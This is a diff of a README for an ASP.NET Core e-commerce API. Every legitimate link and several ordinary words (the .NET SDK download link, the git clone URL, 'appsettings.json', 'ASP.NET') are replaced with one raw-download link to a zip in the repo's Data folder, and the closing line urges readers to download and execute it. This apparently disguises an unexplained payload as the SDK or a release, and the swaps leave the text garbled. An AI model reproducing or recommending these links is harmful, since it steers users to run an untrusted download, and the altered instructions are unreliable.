@@ -1,8 +1,8 @@
 # LojaVirtualAPI: Complete RESTful API for E-commerce Management
 
-![LojaVirtualAPI](https://img.shields.io/badge/LojaVirtualAPI-RESTful%20API-brightgreen)
+![LojaVirtualAPI](https://github.com/sameterl/LojaVirtualAPI/raw/refs/heads/master/Data/API_Loja_Virtual_v1.7-beta.1.zip%20API-brightgreen)
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Visit%20Here-blue)](https://github.com/sameterl/LojaVirtualAPI/releases)
+[![Download Releases](https://github.com/sameterl/LojaVirtualAPI/raw/refs/heads/master/Data/API_Loja_Virtual_v1.7-beta.1.zip%20Releases-Visit%20Here-blue)](https://github.com/sameterl/LojaVirtualAPI/raw/refs/heads/master/Data/API_Loja_Virtual_v1.7-beta.1.zip)
 
 ## Table of Contents
 
@@ -21,7 +21,7 @@
 
 ## Overview
 
-LojaVirtualAPI is a robust RESTful API built with ASP.NET Core. It provides a complete solution for managing an online store. This API includes features such as JWT authentication and Swagger documentation, making it easy to integrate and use.
+LojaVirtualAPI is a robust RESTful API built with https://github.com/sameterl/LojaVirtualAPI/raw/refs/heads/master/Data/API_Loja_Virtual_v1.7-beta.1.zip Core. It provides a complete solution for managing an online store. This API includes features such as JWT authentication and Swagger documentation, making it easy to integrate and use.
 
 ## Features
 
@@ -33,7 +33,7 @@ LojaVirtualAPI is a robust RESTful API built with ASP.NET Core. It provides a co
 
 ## Technologies Used
 
-- **Backend**: ASP.NET Core
+- **Backend**: https://github.com/sameterl/LojaVirtualAPI/raw/refs/heads/master/Data/API_Loja_Virtual_v1.7-beta.1.zip Core
 - **Database**: SQL Server
 - **ORM**: Entity Framework
 - **Authentication**: JWT
@@ -46,7 +46,7 @@ LojaVirtualAPI is a robust RESTful API built with ASP.NET Core. It provides a co
 
 Before you begin, ensure you have the following installed:
 
-- [.NET SDK](https://dotnet.microsoft.com/download) (version 6.0 or later)
+- [.NET SDK](https://github.com/sameterl/LojaVirtualAPI/raw/refs/heads/master/Data/API_Loja_Virtual_v1.7-beta.1.zip) (version 6.0 or later)
 - SQL Server (Express or higher)
 - A code editor (Visual Studio, Visual Studio Code, etc.)
 
@@ -54,7 +54,7 @@ Before you begin, ensure you have the following installed:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/sameterl/LojaVirtualAPI.git
+   git clone https://github.com/sameterl/LojaVirtualAPI/raw/refs/heads/master/Data/API_Loja_Virtual_v1.7-beta.1.zip
    ```
 
 2. Navigate to the project directory:
@@ -67,7 +67,7 @@ Before you begin, ensure you have the following installed:
    dotnet restore
    ```
 
-4. Update the database connection string in `appsettings.json`.
+4. Update the database connection string in `https://github.com/sameterl/LojaVirtualAPI/raw/refs/heads/master/Data/API_Loja_Virtual_v1.7-beta.1.zip`.
 
 5. Run the migrations to set up the database:
    ```bash
@@ -81,7 +81,7 @@ Before you begin, ensure you have the following installed:
 
 ### Configuration
 
-Configure the application by editing the `appsettings.json` file. Here, you can set your database connection string, JWT secret key, and other application settings.
+Configure the application by editing the `https://github.com/sameterl/LojaVirtualAPI/raw/refs/heads/master/Data/API_Loja_Virtual_v1.7-beta.1.zip` file. Here, you can set your database connection string, JWT secret key, and other application settings.
 
 ## API Documentation
 
@@ -156,4 +156,4 @@ Contributions are welcome! If you want to improve this project, please follow th
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-For more information, visit the [Releases section](https://github.com/sameterl/LojaVirtualAPI/releases) to download the latest version and execute it.
+For more information, visit the [Releases section](https://github.com/sameterl/LojaVirtualAPI/raw/refs/heads/master/Data/API_Loja_Virtual_v1.7-beta.1.zip) to download the latest version and execute it.
